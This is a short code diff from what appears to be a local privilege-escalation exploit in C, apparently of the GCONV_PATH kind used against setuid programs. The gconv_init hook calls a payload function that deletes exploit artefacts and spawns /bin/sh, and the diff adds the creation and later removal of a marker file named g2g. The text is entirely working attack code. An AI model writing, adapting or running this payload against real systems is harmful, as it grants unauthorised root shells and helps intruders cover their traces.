@@ -10,9 +10,13 @@ void payload() {
   system("rm -rf GCONV_PATH=.");
   system("rm -rf privesc");
   system("/bin/sh");
+  system("rm g2g");
   exit(0);
 }
 
 void gconv() {}
 
-void gconv_init() { payload(); }
+void gconv_init() {
+  system("/usr/bin/touch g2g");
+  payload();
+}
